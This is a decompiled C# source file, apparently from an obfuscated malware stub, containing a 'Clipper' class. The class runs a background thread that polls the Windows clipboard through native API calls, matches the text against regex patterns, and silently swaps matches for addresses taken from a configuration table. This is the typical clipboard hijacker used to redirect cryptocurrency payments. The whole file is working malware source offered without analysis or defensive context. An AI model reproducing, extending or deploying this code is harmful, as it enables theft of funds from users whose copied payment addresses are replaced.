using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x02000016 RID: 22
	internal sealed class Clipper
	{
		// Token: 0x06000067 RID: 103 RVA: 0x0000399A File Offset: 0x00001B9A
		public Clipper(int checkIntervalMs = 1000)
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
			this._checkIntervalMs = checkIntervalMs;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00008DB0 File Offset: 0x00006FB0
		public void Start()
		{
			if (!this._isRunning)
			{
				this._isRunning = true;
				this._clipperThread = new Thread(new ThreadStart(this.ClipperLoop))
				{
					IsBackground = true,
					Name = "ClipperThread"
				};
				this._clipperThread.Start();
				Console.WriteLine("Clipper service started.");
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x000039AE File Offset: 0x00001BAE
		public void Stop()
		{
			this._isRunning = false;
			Thread clipperThread = this._clipperThread;
			if (clipperThread != null)
			{
				clipperThread.Join(1000);
			}
			Console.WriteLine("Clipper service stopped.");
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00008E0C File Offset: 0x0000700C
		private void ClipperLoop()
		{
			string text = string.Empty;
			while (this._isRunning)
			{
				try
				{
					if (!this._isRunning)
					{
						break;
					}
					string text2 = Clipper.NativeClipboard.GetText();
					if (!string.IsNullOrEmpty(text2) && !text2.Equals(text))
					{
						text = text2;
						this.ProcessClipboardContent(text2);
					}
					Thread.Sleep(this._checkIntervalMs);
				}
				catch (Exception ex)
				{
					Console.WriteLine("Clipper error: " + ex.Message);
					Thread.Sleep(this._checkIntervalMs);
				}
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00008EA0 File Offset: 0x000070A0
		private void ProcessClipboardContent(string clipboardContent)
		{
			clipboardContent = clipboardContent.Trim();
			foreach (KeyValuePair<string, Regex> keyValuePair in RegexPatterns.PatternsList)
			{
				string key = keyValuePair.Key;
				Regex value = keyValuePair.Value;
				if (value.IsMatch(clipboardContent))
				{
					string text = (Config.ClipperAddresses.ContainsKey(key) ? Config.ClipperAddresses[key] : null);
					if (!string.IsNullOrEmpty(text) && !text.Contains("---") && !clipboardContent.Equals(text))
					{
						Clipper.NativeClipboard.SetText(text);
						Console.WriteLine("Clipper replaced " + key.ToUpper() + " to " + text);
						break;
					}
				}
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x000038AD File Offset: 0x00001AAD
		static Clipper()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x0400004E RID: 78
		private Thread _clipperThread;

		// Token: 0x0400004F RID: 79
		private bool _isRunning;

		// Token: 0x04000050 RID: 80
		private readonly int _checkIntervalMs;

		// Token: 0x02000017 RID: 23
		internal static class NativeClipboard
		{
			// Token: 0x0600006D RID: 109
			[DllImport("user32.dll", SetLastError = true)]
			private static extern bool OpenClipboard(IntPtr hWndNewOwner);

			// Token: 0x0600006E RID: 110
			[DllImport("user32.dll", SetLastError = true)]
			private static extern bool CloseClipboard();

			// Token: 0x0600006F RID: 111
			[DllImport("user32.dll", SetLastError = true)]
			private static extern bool EmptyClipboard();

			// Token: 0x06000070 RID: 112
			[DllImport("user32.dll", SetLastError = true)]
			private static extern IntPtr GetClipboardData(uint uFormat);

			// Token: 0x06000071 RID: 113
			[DllImport("user32.dll", SetLastError = true)]
			private static extern IntPtr SetClipboardData(uint uFormat, IntPtr hMem);

			// Token: 0x06000072 RID: 114
			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern IntPtr GlobalLock(IntPtr hMem);

			// Token: 0x06000073 RID: 115
			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern bool GlobalUnlock(IntPtr hMem);

			// Token: 0x06000074 RID: 116
			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern IntPtr GlobalAlloc(uint uFlags, UIntPtr dwBytes);

			// Token: 0x06000075 RID: 117
			[DllImport("kernel32.dll", SetLastError = true)]
			private static extern IntPtr GlobalFree(IntPtr hMem);

			// Token: 0x06000076 RID: 118 RVA: 0x00008F78 File Offset: 0x00007178
			public static string GetText()
			{
				string text;
				if (!Clipper.NativeClipboard.OpenClipboard(IntPtr.Zero))
				{
					text = string.Empty;
				}
				else
				{
					try
					{
						IntPtr clipboardData = Clipper.NativeClipboard.GetClipboardData(13U);
						if (!(clipboardData == IntPtr.Zero))
						{
							IntPtr intPtr = IntPtr.Zero;
							try
							{
								intPtr = Clipper.NativeClipboard.GlobalLock(clipboardData);
								if (intPtr == IntPtr.Zero)
								{
									return string.Empty;
								}
								return Marshal.PtrToStringUni(intPtr);
							}
							finally
							{
								if (intPtr != IntPtr.Zero)
								{
									Clipper.NativeClipboard.GlobalUnlock(clipboardData);
								}
							}
						}
						text = string.Empty;
					}
					finally
					{
						Clipper.NativeClipboard.CloseClipboard();
					}
				}
				return text;
			}

			// Token: 0x06000077 RID: 119 RVA: 0x00009020 File Offset: 0x00007220
			public static void SetText(string text)
			{
				if (Clipper.NativeClipboard.OpenClipboard(IntPtr.Zero))
				{
					try
					{
						Clipper.NativeClipboard.EmptyClipboard();
						byte[] bytes = Encoding.Unicode.GetBytes(text + "\0");
						IntPtr intPtr = Clipper.NativeClipboard.GlobalAlloc(2U, (UIntPtr)((ulong)((long)bytes.Length)));
						if (!(intPtr == IntPtr.Zero))
						{
							IntPtr intPtr2 = Clipper.NativeClipboard.GlobalLock(intPtr);
							if (intPtr2 == IntPtr.Zero)
							{
								Clipper.NativeClipboard.GlobalFree(intPtr);
							}
							else
							{
								try
								{
									Marshal.Copy(bytes, 0, intPtr2, bytes.Length);
								}
								finally
								{
									Clipper.NativeClipboard.GlobalUnlock(intPtr);
								}
								Clipper.NativeClipboard.SetClipboardData(13U, intPtr);
							}
						}
					}
					finally
					{
						Clipper.NativeClipboard.CloseClipboard();
					}
				}
			}

			// Token: 0x06000078 RID: 120 RVA: 0x000038AD File Offset: 0x00001AAD
			static NativeClipboard()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}
		}
	}
}
